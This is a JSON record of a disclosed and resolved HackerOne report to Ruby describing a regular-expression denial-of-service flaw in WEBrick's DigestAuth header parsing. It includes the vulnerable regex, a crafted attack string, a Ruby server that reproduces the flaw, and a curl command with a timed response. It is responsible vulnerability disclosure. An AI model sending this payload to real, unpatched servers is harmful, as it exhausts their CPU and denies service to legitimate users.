{
  "id": 661722,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjE3MjI=",
  "url": "https://hackerone.com/reports/661722",
  "title": "WEBrick::HTTPAuth::DigestAuth authentication is vulnerable to regular expression denial of service (ReDoS)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2019-07-27T05:44:24.810Z",
  "submitted_at": "2019-07-27T05:44:24.810Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "358",
    "url": "/358",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7724,
    "url": "https://hackerone.com/ruby",
    "handle": "ruby",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby",
      "twitter_handle": "",
      "website": "https://www.ruby-lang.org",
      "about": "A Programmer's Best Friend"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-15T23:20:45.123Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-16T23:20:40.329Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The private instance method `split_param_value` in class `WEBrick::HTTPAuth::DigestAuth` uses a regular expression that is vulnerable to denial of service due to catastrophic backtracking.\n\nThe regular expression is: ^\\s*([\\w\\-\\.\\*\\%\\!]+)=\\s*\\\"((\\\\.|[^\\\"])*)\\\"\\s*,?\nSource: https://github.com/ruby/ruby/blob/149e414ed529d27aaeb0543bc133e08c782d8d41/lib/webrick/httpauth/digestauth.rb#L295\n\nSample attack string that causes catastrophic backtracking: a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\n\nThe issue can be reproduced with the following HTTP server configured with DigestAuth:\n\n```\n#!/usr/bin/env ruby\n\nrequire 'webrick'\n\nconfig = { :Realm => 'DigestAuth example realm' }\n\nhtdigest = WEBrick::HTTPAuth::Htdigest.new 'my_password_file'\nhtdigest.set_passwd config[:Realm], 'username', 'password'\nhtdigest.flush\n\nconfig[:UserDB] = htdigest\n\ndigest_auth = WEBrick::HTTPAuth::DigestAuth.new config\n\nauth_handler = proc do |request, response|\n  digest_auth.authenticate request, response\nend\n\nserver = WEBrick::HTTPServer.new :Port => 8000, :RequestCallback => auth_handler\n\nserver.mount_proc '/' do |req, res|\n  res.body = 'hello, world'\nend\n\ntrap 'INT' do server.shutdown end\nserver.start\n```\n\nRunning the program above, an attacker can cause the HTTP server to consume 100% CPU by sending an authorization header that exploits the catastrophic backtracking.\n\nSample HTTP request with cURL:\n```sh\n$ time curl -I --header 'Authorization: Digest a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b' http://localhost:8000\nHTTP/1.1 400 Bad Request \nContent-Type: text/html; charset=ISO-8859-1\nServer: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)\nDate: Sat, 27 Jul 2019 05:38:27 GMT\nContent-Length: 291\nConnection: close\n\n\nreal\t0m9.714s\nuser\t0m0.013s\nsys\t0m0.003s\n```\n\nNote that it takes the HTTP server 9 seconds to respond that it's a bad request. A larger attack string, like 'Authorization: Digest a=\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b', would take much longer to evaluate.\n\n## Impact\n\nAn attacker could cause an effective denial of service, by crafting an input which exploits catastrophic backtracking for the regular expression.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-15T23:20:40.416Z",
  "allow_singular_disclosure_after": -133970708.69428337,
  "singular_disclosure_allowed": true,
  "vote_count": 16,
  "voters": [
    "bl4de",
    "mik317",
    "eren",
    "r0hack",
    "khizer47",
    "lumbridge",
    "t3chn0phil3",
    "cryptographer",
    "kwalberg",
    "shkhan922",
    "and 6 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 28212,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/ruby/ruby",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
